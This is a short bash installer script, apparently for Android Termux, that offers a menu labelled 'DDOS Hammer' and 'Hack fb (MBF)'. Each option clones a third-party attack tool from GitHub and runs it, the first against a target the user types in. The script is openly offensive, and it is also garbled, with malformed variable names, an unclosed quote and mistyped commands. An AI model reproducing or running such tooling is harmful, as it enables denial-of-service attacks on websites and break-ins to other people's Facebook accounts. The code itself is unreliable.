#!/system/bin/bash
#Author Mr.S_D
#Curut BlackHat

clear
b='\033[34;1m'
g='\033[32;1m'  
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
w='\033[37;1m'                                           
y='\033[33;1m'

echo
toilet -f standard " Tools Installer " -F gay | lolcat
echo
echo $r "================"
echo $g"DDOS Hammer"
echo $g"Hack fb (MBF)"
echo $r "================"

echo $y
read -p "ôþ¨¡[Pilih Nomer]
ôþ¨¡crot@Mr.S_D¡ß=ôþ>" Mr.S_D

if [ $Mr.S_D = 1 ] || [ $Mr.S_D = 1 ]
then
clear
echo
toilet -f standard " Hammer " -F gay
echo
echo "
sleep 1
echo $green" Installing Hammer DDOS.."
sleep 1
git clone https://github.com/cyweb/hammer
mv hammer $HOME
cd $HOME/hammer
read -p "Masukan Target:" target
python2 hammer.py -T -t target
fi
 
if [ $Mr.S_D = 2 ] || [ $Mr.S_D = 2 ]
then
clear
pkg update
pkg upgrade
pkg Install python2
pip2 install mechanize
pkg install git
git clone https://github.com/pirmansx/mbf
mv mbf$HOME
cd $HOME/mbf
python2 MBF.py
fi